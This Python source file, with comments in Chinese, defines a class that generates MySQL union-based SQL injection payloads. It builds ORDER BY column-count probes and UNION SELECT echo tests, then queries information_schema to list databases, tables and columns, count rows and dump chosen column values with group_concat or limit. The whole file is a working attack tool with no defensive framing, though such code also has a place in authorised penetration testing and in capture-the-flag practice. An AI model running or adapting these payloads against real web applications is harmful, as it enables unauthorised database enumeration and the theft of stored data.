class Payload():
    pre_payload = '' # payload 前缀，用于引号闭合

    def __init__(self,pre_payload):
        self.pre_payload = pre_payload

    def order_by(self, a):        #传入order by所需的列数
        a = str(a)
        return self.pre_payload + ' order by '+a+' --+'

    def order_list(self, b):      #传入回显列数中的随机数
        list1 = [str(i) for i in b]
        list2 = ','.join(list1)
        return self.pre_payload + ' and 1=2 union select '+list2+' --+'

    def union_sql(self, num1 = None,num2 = None, schema_name = '',table_name = '',column_name = []):
        if num1 == None or num2 == None:
            print("Error,please input num1 and num2.")
            return -1

        elif schema_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(schema_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ', '.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  --+'

        elif table_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(table_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\'--+'

        elif len(column_name) == 0:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(column_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\'--+' 

        else:
            list4 = [str(i) for i in column_name]
            list5 = ',0x60,'.join(list4)
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat('+list5+') ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' --+'

    def count_list(self,num1 = None,num2 = None, schema_name = '',table_name = '',column_name = ''):
        if num1 == None or num2 == None:
            print("Error,please input num1 and num2.")
            return -1

        elif schema_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(schema_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ', '.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  --+'

        elif table_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(table_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\'--+'

        elif column_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(column_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\'--+' 

        else:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(*) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' --+'

    def union_sql_2(self,num1 = None,num2 = None, schema_name = '',table_name = '',column_name = '',num3 = None):
        if num1 == None or num2 == None or num3 == None:
            print("Error,please input num1 and num2 and num3.")
            return -1

        elif schema_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('schema_name ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ', '.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  limit '+str(num3)+',1 --+'

        elif table_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('table_name ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\' limit '+str(num3)+',1 --+'

        elif column_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('column_name ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\' limit '+str(num3)+',1 --+' 

        else:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append(column_name)
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' limit '+str(num3)+',1 --+'